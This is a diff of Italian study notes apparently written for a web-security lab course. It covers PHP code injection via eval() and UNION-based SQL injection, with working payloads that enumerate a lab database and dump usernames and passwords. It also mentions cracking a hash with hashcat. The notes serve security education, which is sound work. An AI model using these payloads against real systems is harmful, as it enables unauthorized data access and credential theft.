@@ -568,7 +568,10 @@ e lo lanciamo usando il doppio `cat`
 
 ## Code Injection 1:  
 
+Si guarda il codice sorgente in `/var/www/codeexec` e si nota che viene usata una stringa $str = 'echo...' e che tale stringa viene interpretata come una espressione php.
+  
 
+    
 La pagina web utilizza il parametro della richiesta `_GET` per stampare un messaggio che viene riflesso da un comando echo lanciato tramite `eval()`
 
 
@@ -601,85 +604,153 @@ name = hacker"
 - Controllare l'input e abbassare i privilegi 
 - Rimuovere la stampa di stderr cambiando il file di configurazione php 
 
-## File Include 1
 
 
 
 
 
+## SQL Injection 1:
 
-- Code Injection 1:
-    Si guarda il codice sorgente in `/var/www/codeexec` e si nota che viene usata una stringa $str = 'echo...' e che tale stringa viene interpretata come una espressione php.  
-    Si usa lo schema di attacco generico: 
-    ``` 
-    INPUT = input legittimo +  
-            carattere separatore codice +  
-            codice php arbitrario  +  
-            carattere chiusura.  
-    ```
+Nel codice sorgente della sfida notiamo che viene costruita una stringa rappresentante uno statement SQL, tale input non viene controllato in alcun modo e viene mandato ad un DBMS MySQL per l'esecuzione.  
 
-    ```bash
-    # useremo la seguente struttura per visualizzare i privilegi:
-    name = hacker \" +
-        + ; 
-        + system("id");
-        + \" 
+```php
+<?php
 
-    # andremo a scrivere nell\'url il seguente input:
-    ...example1.php/name=hacker";system("id");"
-    ```
-    Questo ci permetterà di chiamare ID e vedere gli uid e gid 
-- XSS 1 
-- File include 1 
+  require_once('../header.php');
+  require_once('db.php');
+	$sql = "SELECT * FROM users where name='";
+	$sql .= $_GET["name"]."'";	
+	$result = mysql_query($sql); 
+	if ($result) {
+		?>
+		<table class='table table-striped'>
+      <tr><th>id</th><th>name</th><th>age</th></tr>
+		<?php
+		while ($row = mysql_fetch_assoc($result)) {
+			echo "<tr>";
+    			echo "<td>".$row['id']."</td>";
+    			echo "<td>".$row['name']."</td>";
+    			echo "<td>".$row['age']."</td>";
+			echo "</tr>";
+		}	
+		echo "</table>";
+	}
+  require_once '../footer.php';
+?>
+
+```
+
+Si adotta lo schema classico di iniezione al caso specifico.  
+
+È possibile usare l'operatore **`OR`** per iniettare un comando e l'espressione in questo modo diventa una _tautologia_:  
+
+```
+name=root'OR 1=1%23`
+```
+
+È possibile determinare il numero di colonne: usiamo `ORDER BY` e il fatto che nelle query ci si possa riferire ad una colonna tramite indice numerico.  
+Proviamo a parire da 1 e incrementiamo il valore dell'order by fino a quando non viene generato un errore (che vuol dire che stiamo cercando di inicizzare una colonna che non esiste), al primo errore che vediamo possiamo concludere dicendo che esistono $N-1$ colonne, dove $N$ è il tentativo che ha portato all'errore.  
+
+```
+name=root' order by 5 %23
+name=root' order by 6 %23 --- genera errore
+```
+
+Una volta che abbiamo questi dati possiamo ottenere informazioni più interessanti per un attaccante, come il nome della tabella, il numero di colonne, ecc... 
 
 
-## SQL Injections:
+Ottenere il nome del database in uso, la versione e l'utente connesso
 
-- SQL Injection 1:  
-    Nel codice sorgente della sfida notiamo che viene costruita una stringa rappresentante uno statement SQL, tale input non viene controllato in alcun modo e viene mandato ad un DBMS MySQL per l'esecuzione.  
-    Si adotta lo schema classico di iniezione al caso specifico.  
-    È possibile usare l'operatore **`OR`** per iniettare un comando e l'espressione in questo modo diventa una _tautologia_
+```
+name=root' union select version(), database(), current_user(),4,5 %23
+```
 
-    ```bash
-    # tautologia
-    .../example1.php/name=root 'or 1=1%23 '#
+Ottenere il nome della tabella
 
-    # clausola SELECT e ORDER BY (per determinare il numero di colonne)  
-    .../exmaple1.php/name=root' UNION SELECT NULL,NULL,NULL,NULL,NULL%23 '#
-    # oppure 
-    .../exmaple1.php/name=root' ORDER BY 6 %23 '# genera un errore allora capisco che si tratta di 5 colonne, infatti:
-    .../exmaple1.php/name=root' ORDER BY 5 %23 # non genera errore ! '#
-    ```
+```
+name=root' union select table_name,2,3,4,5 from information_schema.tables where table_schema='exercises'%23
+```
 
-    Una volta determinato il numero di colonne riesco a eseguire Query omogenee, a questo punto posso enumerare il db e ottenere il suo nome per avanzare nella SQL injection:
+Ottenere il nome delle colonne:  
 
-    - `root' UNION SELECT version(), database(), current_user(),4,5 %23`
+```
+name=root' union select column_name,2,3,4,5 from information_schema.columns where table_schema='exercises' and table_name='users' %23
+```
 
-    A questo punto ottengo il nome del DB ossia **exercises**
+Otteniamo che esistono le colonne: id, name, age, groupid, passwd.  
+Con questa informazione possiamo fare il dump delle informazioni che ci interessano, come user id e la password 
 
-    Per estrarre le tabelle interessanti del DB devo iniettare il comando `information_schema.tables` tramite una UNION.  
+Stampa ID, nome utente e password
 
-    - `root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables where table_schema='exercises'%23`  
-    Noto che il db exercises ha una sola tabella di nome `users`  
+```
+name=root' UNION SELECT id, name, passwd,4,5 FROM users %23 
+# per risparmiare spazio si può sfruttare concat()
+name=root' union select concat(id,':',name,':',passwd),2,3,4,5 from users %23
+```
 
-    Faccio la stessa cosa ma per vedere la struttura della colonne  
-    - `root' UNION SELECT column_name,2,3,4,5 from information_schema.columns where table_schema ='exercises and table_name='users' %23`
-    Noto che la tabella users ha 5 colonne: id, name, age, groupid, passwd  
+<br>
 
-    A questo punto posso fare il dump della tabella, basta uno statement SELECT che selezioni le colonne interessanti (id,name,passwd) della tabella di interessa (users)
+---
 
-    - `root' UNION SELECT id,name,passwd,4,5 from users %23`
 
-    ![result sql injection 1](../../images/sql_inj_result1.png)  
+### vecchia spiegazione
 
-    **nota:** Se si è a corto di colonne riflesse si può usare la funzione di sistema `concat()` per concatenare valori di colonne diverse.  
 
-    - `root' UNION SELECT concat(id,':',name,':',passwd),2,3,4,5 from users %23`  
-    In questo modo l'ouput interessante ora è compattato in un unica colonna.  
+
+Una volta determinato il numero di colonne riesco a eseguire Query omogenee, a questo punto posso enumerare il db e ottenere il suo nome per avanzare nella SQL injection:
+
+- `root' UNION SELECT version(), database(), current_user(),4,5 %23`
+
+A questo punto ottengo il nome del DB ossia **exercises**
+
+Per estrarre le tabelle interessanti del DB devo iniettare il comando `information_schema.tables` tramite una UNION.  
+
+- `root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables where table_schema='exercises'%23`  
+Noto che il db exercises ha una sola tabella di nome `users`  
+
+Faccio la stessa cosa ma per vedere la struttura della colonne  
+- `root' UNION SELECT column_name,2,3,4,5 from information_schema.columns where table_schema ='exercises and table_name='users' %23`
+Noto che la tabella users ha 5 colonne: id, name, age, groupid, passwd  
+
+A questo punto posso fare il dump della tabella, basta uno statement SELECT che selezioni le colonne interessanti (id,name,passwd) della tabella di interessa (users)
+
+- `root' UNION SELECT id,name,passwd,4,5 from users %23`
+
+![result sql injection 1](../../images/sql_inj_result1.png)  
+
+**nota:** Se si è a corto di colonne riflesse si può usare la funzione di sistema `concat()` per concatenare valori di colonne diverse.  
+
+- `root' UNION SELECT concat(id,':',name,':',passwd),2,3,4,5 from users %23`  
+In questo modo l'ouput interessante ora è compattato in un unica colonna.  
     
-- SQL injection 2:  
 
 
-    ```bash
-    ```
 
+<br><br>
+
+
+## SQL Injection 2:
+
+
+
+```bash
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+domande:
+- esercizio 5 (decomprimere archivio e utilizzarne contenuto)
+- esercizio 6 - hash salvato in chiaro, usare hashcat e rockyou come dizionario 
+- esercizio 8 - serve wireshark 
